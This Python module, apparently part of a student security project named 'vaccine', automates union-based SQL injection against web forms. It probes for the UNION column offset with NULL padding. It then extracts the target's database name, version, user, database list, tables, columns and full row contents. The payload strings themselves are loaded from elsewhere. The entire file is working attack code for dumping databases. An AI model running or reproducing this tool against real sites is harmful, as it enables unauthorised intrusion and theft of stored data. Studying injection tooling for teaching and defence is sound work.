# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    union.py                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: luzog78 <luzog78@gmail.com>                +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/12/15 18:52:32 by luzog78           #+#    #+#              #
#    Updated: 2025/12/16 02:42:47 by luzog78          ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from typing import Any

from exploits import Exploit
from vaccine import Database, Form, DBServer, InputField, Table, print


def union_exploit(
		headers: dict[str, str],
		server: DBServer,
		ignored_databases: list[str],
		payloads: dict[str, str],
		delimiter: str,
		form: Form,
		input: InputField | None,
		verbose: bool,
		) -> bool:
	inputs = [input] if input is not None else form.inputs
	for _input in inputs:
		exploit = Exploit(
			exploit_name='union',
			headers=headers,
			server=server,
			ignored_databases=ignored_databases,
			payloads=payloads,
			delimiter=delimiter,
			form=form,
			input=_input,
			verbose=verbose,
		)

		exploit.memory['offset_bounds'] = int(payloads['min_offset']), int(payloads['max_offset'])

		result = exploit.do_exploit(
			database_exploit_func=database_union_exploit,
			version_exploit_func=version_union_exploit,
			user_exploit_func=user_union_exploit,
			databases_exploit_func=databases_union_exploit,
			tables_exploit_func=tables_union_exploit,
			columns_exploit_func=columns_union_exploit,
			rows_exploit_func=rows_union_exploit,
		)
		if result:
			return True
	return False


def build_offset(offset_bef: int, offset_aft: int) -> tuple[str, str]:
	return ''.join(['NULL,'] * offset_bef), ''.join([',NULL'] * offset_aft)


def database_union_exploit(exploit: Exploit, payload: str) -> Database | None:
	min_offset, max_offset = exploit.memory['offset_bounds']

	database_name = None
	for cols in range(min_offset + 1, max_offset + 2):
		for off_bef in range(min_offset, cols):
			off_aft = cols - off_bef - 1

			offset_bef, offset_aft = build_offset(off_bef, off_aft)
			database_name = exploit.fetch_unique(
				payload,
				offset_bef=offset_bef,
				offset_aft=offset_aft,
			)
			if database_name is not None:
				print(f'    [+] Found UNION offset: {off_bef} columns before, {off_aft} columns after (total {cols} columns)')
				exploit.memory['offset'] = off_bef, off_aft
				break
		else:
			continue
		break

	if database_name is None:
		print('    [!] Exploit failed: Cannot retrieve current database name')
		return None

	print(f'    [+] Exploit successful: Current database name is {repr(database_name)}')
	db = exploit.server.get_db(database_name)
	if db is None:
		db = Database(name=database_name)
		exploit.server.dbs.append(db)
	return db


def version_union_exploit(exploit: Exploit, payload: str) -> str | None:
	offset_bef, offset_aft = build_offset(*exploit.memory['offset'])
	version = exploit.fetch_unique(
		payload,
		offset_bef=offset_bef,
		offset_aft=offset_aft,
	)
	if version is None:
		print('    [!] Exploit failed: Cannot retrieve database version')
		return None

	print(f'    [+] Exploit successful: Database version is {repr(version)}')
	exploit.server.version = version
	return version


def user_union_exploit(exploit: Exploit, payload: str) -> str | None:
	offset_bef, offset_aft = build_offset(*exploit.memory['offset'])
	user = exploit.fetch_unique(
		payload,
		offset_bef=offset_bef,
		offset_aft=offset_aft,
	)
	if user is None:
		print('    [!] Exploit failed: Cannot retrieve database user')
		return None

	print(f'    [+] Exploit successful: Database user is {repr(user)}')
	exploit.server.user = user
	return user


def databases_union_exploit(exploit: Exploit, payload: str) -> list[Database] | None:
	offset_bef, offset_aft = build_offset(*exploit.memory['offset'])
	database_names, success = exploit.fetch(
		payload,
		offset_bef=offset_bef,
		offset_aft=offset_aft,
	)
	if not success:
		print('    [!] Exploit failed: Cannot retrieve database names')
		return None

	print(f'    [+] Exploit successful: Found {len(database_names)} databases: {", ".join([repr(db) for db in database_names])}')
	databases = []
	for database_name in database_names:
		db = exploit.server.get_db(database_name)
		if db is None:
			db = Database(name=database_name)
			exploit.server.dbs.append(db)
		databases.append(db)
	return databases


def tables_union_exploit(exploit: Exploit, payload: str,
		database: Database) -> list[Table] | None:
	offset_bef, offset_aft = build_offset(*exploit.memory['offset'])
	table_names, success = exploit.fetch(
		payload,
		database=database.name,
		offset_bef=offset_bef,
		offset_aft=offset_aft,
	)
	if not success:
		print('      [!] Exploit failed: Cannot retrieve table names')
		return None

	print(f'      [+] Exploit successful: Found {len(table_names)} tables: {", ".join([repr(t) for t in table_names])}')
	tables = []
	for table_name in table_names:
		table = database.get_table(table_name)
		if table is None:
			table = Table(name=table_name)
			database.tables.append(table)
		tables.append(table)
	return tables


def columns_union_exploit(exploit: Exploit, payload: str,
		database: Database, table: Table) -> list[str] | None:
	offset_bef, offset_aft = build_offset(*exploit.memory['offset'])
	columns, success = exploit.fetch(
		payload,
		database=database.name,
		table=table.name,
		offset_bef=offset_bef,
		offset_aft=offset_aft,
	)
	if not success:
		print(f'        [!] Exploit of {repr(table.name)} failed: Cannot retrieve column names')
		return None

	print(f'        [+] Exploit of {repr(table.name)} successful: Found {len(columns)} columns: {", ".join([repr(c) for c in columns])}')
	table.columns = columns
	return columns


def rows_union_exploit(exploit: Exploit, payload: str, database: Database,
			table: Table, column: str, column_idx: int) -> list[str] | None:
	offset_bef, offset_aft = build_offset(*exploit.memory['offset'])
	rows, success = exploit.fetch(
		payload,
		database=database.name,
		table=table.name,
		column=column,
		offset_bef=offset_bef,
		offset_aft=offset_aft,
	)
	if not success:
		print('          [!] Exploit failed: Cannot retrieve rows')
		return None

	print(f'          [+] Exploit successful: Found {len(rows)} rows in {table.name}.{column}')

	table_rows_len = len(table.rows)
	table_columns_len = len(table.columns)
	for i, row in enumerate(rows):
		if i < table_rows_len:
			r = table.rows[i]
		else:
			r: list[Any] = [None] * table_columns_len
			table.rows.append(r)
		row_len = len(r)
		if row_len < table_columns_len:
			r.extend([None] * (table_columns_len - row_len))
		r[column_idx] = row
	return rows
